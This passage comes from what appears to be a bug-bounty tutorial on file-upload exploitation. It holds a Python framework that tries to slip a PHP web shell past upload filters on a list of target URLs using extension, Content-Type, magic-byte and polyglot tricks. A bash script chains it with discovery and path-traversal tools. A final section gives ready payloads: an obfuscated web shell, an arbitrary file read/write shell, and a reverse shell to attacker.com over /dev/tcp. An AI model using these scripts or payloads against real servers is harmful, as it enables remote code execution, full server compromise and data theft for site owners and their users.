            # Case variations
            f'{base_name}.PHP',
            f'{base_name}.Php',
            f'{base_name}.pHP',
            f'{base_name}.PhP',
            
            # Null byte injection
            f'{base_name}.php\x00.jpg',
            f'{base_name}.php%00.jpg',
            f'{base_name}.php\x00.png',
            
            # Special characters
            f'{base_name}.php.',
            f'{base_name}.php ',
            f'{base_name}.php	',
            f'{base_name}.php
',
            
            # Unicode variations
            f'{base_name}.ph\u0070',  # Unicode 'p'
            f'{base_name}.\u0070hp',  # Unicode 'p'
            
            # NTFS ADS
            f'{base_name}.php::$DATA',
            f'{base_name}.php:hidden.jpg',
            
            # Multiple dots
            f'{base_name}..php',
            f'{base_name}...php',
            f'{base_name}.php..jpg',
            
            # Reverse extensions
            f'{base_name}.jpg.php.jpg',
            f'{base_name}.png.php.png',
            
            # Long extensions
            f'{base_name}.{"p" * 100}hp',
            f'{base_name}.php{"x" * 100}',
        ]
        
        for filename in bypass_techniques:
            try:
                # Test with different content types
                content_types = [
                    'application/octet-stream',
                    'text/plain',
                    'image/jpeg',
                    'image/png',
                    'image/gif',
                    'application/x-php',
                ]
                
                for content_type in content_types:
                    files = {'file': (filename, payload.encode(), content_type)}
                    response = self.session.post(upload_url, files=files, timeout=10)
                    
                    if response.status_code == 200 and 'error' not in response.text.lower():
                        results.append({
                            'filename': filename,
                            'content_type': content_type,
                            'upload_url': upload_url,
                            'bypass_type': 'Extension Bypass'
                        })
                        print(f"✅ Extension bypass: {filename} with {content_type}")
                        
            except Exception as e:
                continue
        
        return results
    
    def test_content_type_bypasses(self, upload_url, payload):
        """Test Content-Type header bypass techniques"""
        results = []
        filename = 'shell.php'
        
        # Content-Type bypass techniques
        content_types = [
            # Image types
            'image/jpeg',
            'image/jpg',
            'image/png',
            'image/gif',
            'image/bmp',
            'image/tiff',
            'image/webp',
            
            # Document types
            'application/pdf',
            'application/msword',
            'application/vnd.ms-excel',
            'text/plain',
            'text/csv',
            
            # Mixed case
            'Image/Jpeg',
            'IMAGE/JPEG',
            'image/JPEG',
            
            # With charset
            'image/jpeg; charset=utf-8',
            'text/plain; charset=utf-8',
            
            # Multiple values
            'image/jpeg, image/png',
            'text/plain, image/jpeg',
            
            # Invalid but accepted
            'image/php',
            'application/php',
            'text/php',
            
            # Empty or null
            '',
            'null',
            'undefined',
        ]
        
        for content_type in content_types:
            try:
                files = {'file': (filename, payload.encode(), content_type)}
                response = self.session.post(upload_url, files=files, timeout=10)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    results.append({
                        'filename': filename,
                        'content_type': content_type,
                        'upload_url': upload_url,
                        'bypass_type': 'Content-Type Bypass'
                    })
                    print(f"✅ Content-Type bypass: {content_type}")
                    
            except Exception as e:
                continue
        
        return results
    
    def test_magic_byte_bypasses(self, upload_url, payload):
        """Test magic byte bypass techniques"""
        results = []
        
        for file_type, magic_bytes in self.magic_bytes.items():
            try:
                # Prepend magic bytes to payload
                malicious_content = magic_bytes + b'
' + payload.encode()
                
                # Test with appropriate extension
                extensions = {
                    'jpg': '.jpg',
                    'png': '.png',
                    'gif': '.gif',
                    'pdf': '.pdf',
                    'zip': '.zip',
                    'rar': '.rar',
                    'exe': '.exe',
                    'elf': '.elf',
                }
                
                filename = f'shell{extensions.get(file_type, ".bin")}'
                content_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
                
                files = {'file': (filename, malicious_content, content_type)}
                response = self.session.post(upload_url, files=files, timeout=10)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    results.append({
                        'filename': filename,
                        'file_type': file_type,
                        'magic_bytes': magic_bytes.hex(),
                        'upload_url': upload_url,
                        'bypass_type': 'Magic Byte Bypass'
                    })
                    print(f"✅ Magic byte bypass: {file_type} - {filename}")
                    
            except Exception as e:
                continue
        
        return results
    
    def test_polyglot_bypasses(self, upload_url, payload):
        """Test polyglot file bypass techniques"""
        results = []
        
        for poly_type, template in self.polyglot_templates.items():
            try:
                # Replace placeholder with actual payload
                polyglot_content = template.replace(b'<?php system($_GET["cmd"]); ?>', payload.encode())
                
                # Determine filename and content type
                if 'jpg' in poly_type:
                    filename = 'polyglot.jpg'
                    content_type = 'image/jpeg'
                elif 'png' in poly_type:
                    filename = 'polyglot.png'
                    content_type = 'image/png'
                elif 'gif' in poly_type:
                    filename = 'polyglot.gif'
                    content_type = 'image/gif'
                else:
                    filename = 'polyglot.bin'
                    content_type = 'application/octet-stream'
                
                files = {'file': (filename, polyglot_content, content_type)}
                response = self.session.post(upload_url, files=files, timeout=10)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    results.append({
                        'filename': filename,
                        'polyglot_type': poly_type,
                        'upload_url': upload_url,
                        'bypass_type': 'Polyglot Bypass'
                    })
                    print(f"✅ Polyglot bypass: {poly_type} - {filename}")
                    
            except Exception as e:
                continue
        
        return results

# Usage
def main():
    with open('upload_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    bypass_framework = UploadBypassFramework()
    payload = '<?php system($_GET["cmd"]); ?>'
    all_results = []
    
    for url in urls:
        print(f"🎯 Testing bypass techniques on {url}")
        
        # Test extension bypasses
        ext_results = bypass_framework.test_extension_bypasses(url, payload)
        all_results.extend(ext_results)
        
        # Test Content-Type bypasses
        ct_results = bypass_framework.test_content_type_bypasses(url, payload)
        all_results.extend(ct_results)
        
        # Test magic byte bypasses
        mb_results = bypass_framework.test_magic_byte_bypasses(url, payload)
        all_results.extend(mb_results)
        
        # Test polyglot bypasses
        poly_results = bypass_framework.test_polyglot_bypasses(url, payload)
        all_results.extend(poly_results)
    
    # Save results
    with open('upload_bypass_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ Bypass testing completed! Found {len(all_results)} successful bypasses")

if __name__ == "__main__":
    main()
```

## 🚀 Complete File Upload & Path Traversal Testing Automation

```bash
#!/bin/bash
# complete_file_upload_test.sh - Complete file upload and path traversal testing

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./complete_file_upload_test.sh target.com"
    exit 1
fi

echo "🔥 Starting Complete File Upload & Path Traversal Testing for $TARGET"
mkdir -p file_upload_results
cd file_upload_results

# Phase 1: Discovery
echo "🔍 Phase 1: File Upload Discovery"
../file_upload_discovery.sh $TARGET

# Phase 2: Fingerprinting
echo "🔍 Phase 2: Upload Endpoint Fingerprinting"
python3 ../upload_fingerprint.py

# Phase 3: RCE Testing
echo "💥 Phase 3: RCE via File Upload Testing"
python3 ../file_upload_rce.py

# Phase 4: Path Traversal Testing
echo "🎯 Phase 4: Advanced Path Traversal Testing"
python3 ../path_traversal_advanced.py

# Phase 5: Bypass Testing
echo "🔧 Phase 5: Upload Filter Bypass Testing"
python3 ../upload_bypass_framework.py

# Phase 6: Generate Comprehensive Report
echo "📊 Generating File Upload Security Report..."
cat > file_upload_security_report.md << 'EOF'
# File Upload & Path Traversal Security Assessment Report

## Executive Summary
This report contains findings from comprehensive file upload and path traversal security testing.

## Discovered Upload Endpoints
$(cat ../upload_endpoints.txt 2>/dev/null | wc -l) file upload endpoints discovered

## Critical Findings

### Remote Code Execution (RCE)
- File upload endpoints allowing code execution
- Web shell upload successful
- Server-side code execution confirmed

### Path Traversal Vulnerabilities
- Directory traversal via file upload
- Local file inclusion (LFI) vulnerabilities
- Remote file inclusion (RFI) vulnerabilities
- Sensitive file disclosure

### Filter Bypass Techniques
- Extension filter bypasses
- Content-Type header bypasses
- Magic byte bypasses
- Polyglot file bypasses

## Business Impact
1. **Critical**: Remote code execution can lead to complete server compromise
2. **High**: Path traversal can expose sensitive system files and configurations
3. **Medium**: Filter bypasses can lead to malicious file uploads

## Recommendations
1. Implement strict file type validation using both extension and content analysis
2. Use a whitelist approach for allowed file types
3. Store uploaded files outside the web root
4. Implement proper input validation for all file-related parameters
5. Use sandboxed environments for file processing
6. Implement virus scanning for uploaded files
7. Set proper file permissions and access controls
8. Use Content Security Policy (CSP) headers
9. Implement rate limiting for file uploads
10. Regular security audits and penetration testing

## Technical Recommendations
1. **Server Configuration**:
   - Disable script execution in upload directories
   - Use .htaccess or web.config to prevent execution
   - Implement proper MIME type checking

2. **Application Level**:
   - Validate file signatures (magic bytes)
   - Rename uploaded files with random names
   - Implement file size limits
   - Use secure file upload libraries

3. **Infrastructure**:
   - Use Web Application Firewall (WAF)
   - Implement network segmentation
   - Regular security updates and patches

EOF

echo "✅ File upload and path traversal testing completed!"
echo "📁 Results saved in file_upload_results/ directory"
echo "📊 Report: file_upload_results/file_upload_security_report.md"

# Create summary of findings
echo "🎯 SUMMARY OF CRITICAL FINDINGS:"
echo "================================"

if [ -f "file_upload_rce_results.json" ]; then
    rce_count=$(cat file_upload_rce_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🔥 RCE Vulnerabilities Found: $rce_count"
fi

if [ -f "path_traversal_results.json" ]; then
    traversal_count=$(cat path_traversal_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🎯 Path Traversal Vulnerabilities Found: $traversal_count"
fi

if [ -f "upload_bypass_results.json" ]; then
    bypass_count=$(cat upload_bypass_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🔧 Filter Bypasses Found: $bypass_count"
fi

echo "================================"
echo "💰 Estimated Bug Bounty Value: $1000 - $10,000+ per critical finding"
echo "🏆 Focus on RCE and path traversal for highest payouts!"
```

## 🎯 Elite Pro Tips for File Upload Testing

### 1. Advanced Reconnaissance
```bash
# Find upload functionality in mobile apps
grep -r "upload" /path/to/decompiled/app/
grep -r "file" /path/to/decompiled/app/
grep -r "multipart" /path/to/decompiled/app/

# GitHub reconnaissance for upload endpoints
curl -s "https://api.github.com/search/code?q=upload+$TARGET" | jq -r '.items[].html_url'
curl -s "https://api.github.com/search/code?q=file_upload+$TARGET" | jq -r '.items[].html_url'
```

### 2. Business Logic Testing
- **Race Conditions**: Upload multiple files simultaneously
- **Storage Exhaustion**: Upload large files to fill disk space
- **Overwrite Attacks**: Upload files with existing names
- **Symlink Attacks**: Create symbolic links to sensitive files

### 3. Real-World Attack Scenarios
- **CMS Upload**: WordPress, Drupal, Joomla file upload bypasses
- **Avatar Upload**: Profile picture upload leading to XSS/RCE
- **Document Upload**: PDF, Office document with embedded payloads
- **Image Upload**: Polyglot images with embedded code

### 4. Advanced Payloads
```php
// PHP Web Shell with obfuscation
<?php $a=base64_decode("c3lzdGVt");$b=$_GET["c"];$a($b); ?>

// PHP File Manager
<?php if($_GET["f"]=="r"){echo file_get_contents($_GET["p"]);}if($_GET["f"]=="w"){file_put_contents($_GET["p"],$_GET["c"]);} ?>

// PHP Reverse Shell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"); ?>
```

This comprehensive file upload and path traversal framework covers everything from basic discovery to advanced exploitation techniques. Each script is designed to find high-value vulnerabilities that can result in $1000+ bug bounty rewards. The methodology includes real-world attack scenarios and advanced bypass techniques used by elite penetration testers.

Remember to always test on authorized targets only and follow responsible disclosure practices!
